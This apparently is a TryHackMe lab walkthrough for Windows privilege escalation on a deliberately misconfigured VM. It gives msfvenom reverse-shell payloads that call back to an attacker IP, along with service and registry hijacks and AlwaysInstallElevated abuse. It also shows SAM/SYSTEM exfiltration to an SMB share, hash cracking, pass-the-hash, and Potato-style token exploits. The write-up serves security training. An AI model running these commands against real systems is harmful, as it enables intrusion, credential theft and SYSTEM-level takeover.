# [Windows PrivEsc](https://tryhackme.com/room/windows10privesc)

> Practice your Windows Privilege Escalation skills on an intentionally misconfigured Windows VM with multiple ways to get admin/SYSTEM! RDP is available. Credentials: user:password321

## Generate a Reverse Shell Executable

generate a reverse shell executable using msfvenom

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.37.45 LPORT=4444 -f exe -o reverse.exe
python3 -m http.server
```

on windows 10 machine

```
curl 10.18.37.45:8000/reverse.exe -o reverse.exe
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ca36fef7-fb30-490d-8cdb-4fe80ecec0cb)

## Service Exploits - Insecure Service Permissions

use accesschk.exe to check the "user" account's permissions on the "daclsvc" service

```
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```

note that we has permission to change the service config

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/cdd9f8be-06ee-4513-b18b-bf311c967c12)

query the service

```
sc qc daclsvc
```

note that it runs with LocalSystem privileges

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/eb5d8b44-0830-4cfa-9e3a-8b93afdd8f80)

modify the service config and set the binpath to our reverse.exe

```
sc config daclsvc binpath= "\"C:\Users\user\Desktop\reverse.exe\""
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/023a38cd-e46f-48c1-8614-e8e629e976d2)

now, start another listener and run the service

```
net start daclsvc
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/91c0d9a0-94ac-4a53-8691-ce418f0e2b4a)

## Service Exploits - Unquoted Service Path

query the "unquotedsvc" service

```
sc qc unquotedsvc
```

note that it runs with LocalSystem privileges and the BINARY_PATH_NAME is unquoted and contains spaces

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/34461819-21a8-415e-8566-083fb8eb5668)

using accesschk.exe again

```
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

note that BUILTIN\Users group is allowed to write

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f9aba4f4-9ef4-4a1d-a984-3cda2a0fd070)

```
copy C:\Users\user\Desktop\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

now, start another listener and run the service

```
net start unquotedsvc
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/518160aa-d719-4c3b-8961-037ebbc33ae6)

## Service Exploits - Weak Registry Permissions

query the "regsvc" service

```
sc qc regsvc
```

note that it runs with LocalSystem privileges

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/0a5e87d3-6d01-4c5d-b1de-fe393e466218)

using accesschk.exe again

```
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

note that the registry entry is writable by the "NT AUTHORITY\INTERACTIVE" group (all logged-on users)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5a20f6c2-18ac-4b45-8404-0335708a97b5)

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Users\user\Desktop\reverse.exe /f
```

now, start another listener and run the service

```
net start regsvc
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/87705866-e9a3-4327-9fd0-4025d328f153)

## Service Exploits - Insecure Service Executables

query the "filepermsvc" service

```
sc qc filepermsvc
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c3810a93-cdbd-4144-a6c7-6aafd41c868a)

using accesschk.exe again

```
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

note that the service binary is writable by everyone

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/619bd38f-9453-440f-962f-4b2303cbbc16)

```
copy C:\Users\user\Desktop\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```

now, start another listener and run the service

```
net start filepermsvc
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/182af3cc-1af3-4f1a-a5e5-41b0767732df)

## Registry - AutoRuns

query the registry for AutoRun executables

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b66179b8-83b7-49a1-a37c-056eba3c1167)

using accesschk.exe again

```
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

note that the AutoRun program is writable by everyone

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/aff2109d-c318-4d27-9965-3baaeba7fb6e)

```
copy C:\Users\user\Desktop\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```

now, start another listener

restart the windows machine and login again to trigger reverse shell

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/115afb27-1031-4e2b-a42e-fbd2028149ec)

## Registry - AlwaysInstallElevated

query the registry for AlwaysInstallElevated keys

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

note that both keys are set to 1 (0x1)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/da181abc-1d73-414d-9b59-87fba7aa82a0)

generate a reverse shell Windows Installer using msfvenom

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.37.45 LPORT=4444 -f msi -o reverse.msi
python3 -m http.server
```

on windows 10 machine

```
curl 10.18.37.45:8000/reverse.msi -o reverse.msi
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/966f35ff-328e-4c31-bb7e-695b4391c664)

now, start another listener and run the service

```
msiexec /quiet /qn /i C:\Users\user\Desktop\reverse.msi
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3f5294ba-8d77-4ab0-ab36-69d687fbda40)

## Passwords - Registry

before this step, admin account need login with admin:password123

sometimes registry can be searched for keys and values that contain the word "password"

```
reg query HKLM /f password /t REG_SZ /s
```

or query this specific key to find admin AutoLogon credentials

```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/0b385b15-c413-431a-b8fa-28b012f22ac3)

## Passwords - Saved Creds

list any saved credentials

```
cmdkey /list
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ab934362-fc78-448c-9e8b-2cab5fa44a1a)

now, start another listener and run the service

```
runas /savecred /user:admin C:\Users\admin\Desktop\reverse.exe
```

## Passwords - Security Account Manager (SAM)

the SAM and SYSTEM files can be used to extract user password hashes

transfer the SAM and SYSTEM files to our machine

on our machine

```
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .
```

on windows VM

```
copy C:\Windows\Repair\SAM \\10.18.37.45\share\
copy C:\Windows\Repair\SYSTEM \\10.18.37.45\share\
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/2c979ef2-50af-4fe2-936f-0c00e06c599b)

now, dump the hash

```
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/880ca9e9-4c34-4b79-b153-88d093c5d37b)

crack the admin NTLM hash using hashcat

```
hashcat -m 1000 --force hash.txt /usr/share/wordlists/rockyou.txt
```

we got 2 passwords are `admin:password123` and `Administrator:Passw0rd!`

## Passwords - Passing the Hash

you can authenticate using the hash

use the full admin hash with pth-winexe without needing to crack password

```
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.13.218 cmd.exe
```

## Scheduled Tasks

view the contents of CleanUp.ps1 script

```
type C:\DevTools\CleanUp.ps1
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f42e85b5-0274-45b1-8fc6-340fc80f8265)

using accesschk.exe again

```
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
```

note that we have the ability to write this file

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e32b4957-f504-4fab-9e83-1474fc8a2c31)

```
echo C:\Users\user\Desktop\reverse.exe >> C:\DevTools\CleanUp.ps1
```

now, start another listener and wait for Scheduled Task

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/25219459-b6df-48a6-bafc-d86a435465de)

## Insecure GUI Apps

login as `user` account, open "AdminPaint" on Desktop

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/79c73785-8002-42d5-b39e-88a16a7d666e)

```
tasklist /V | findstr mspaint.exe
```

note that Paint is running with admin privilege

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/fb9a4adf-2758-4131-ad44-d97d4de2a763)

In Paint, click "File" and then "Open", navigation to C:\Windows\System32\cmd.exe

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5bf4f904-b46b-4a13-9626-7fc036d3e0bb)

## Startup Apps

using accesschk.exe to check StartUp directory

```
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

note that the BUILTIN\Users group can write files

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3cf0db6a-883c-4299-9e2a-9d49060d84a7)

using cscript which should create a new shortcut to your reverse.exe executable in the StartUp directory

```
cscript C:\PrivEsc\CreateShortcut.vbs
```

now, start another listener

restart the windows machine and login again to trigger reverse shell

## Token Impersonation - Rogue Potato

set up a socat redirector, forwarding attacker port 135 to port 9999 on Windows

```
sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.13.218:9999
```

start another listener

simulate getting a service account shell by logging into RDP as the admin user, starting an command prompt as administrator

using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account

```
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\Users\user\Desktop\reverse.exe
```

start another listener

now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell with SYSTEM privileges

```
C:\PrivEsc\RoguePotato.exe -r 10.18.37.45 -e "C:\Users\user\Desktop\reverse.exe" -l 9999
```

two user privileges that allows this exploit to work

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c14f56c2-5e55-4934-9ca0-cf4b04181ac8)

## Token Impersonation - PrintSpoofer

do the same 2 steps before, but now we use PrintSpoofer exploit instead of RoguePotato

```
C:\PrivEsc\PrintSpoofer.exe -c "C:\Users\user\Desktop\reverse.exe" -i
```

## Privilege Escalation Scripts

several tools have been written which help find potential privilege escalations on Windows

+ winPEASany.exe
+ Seatbelt.exe
+ PowerUp.ps1
+ SharpUp.exe
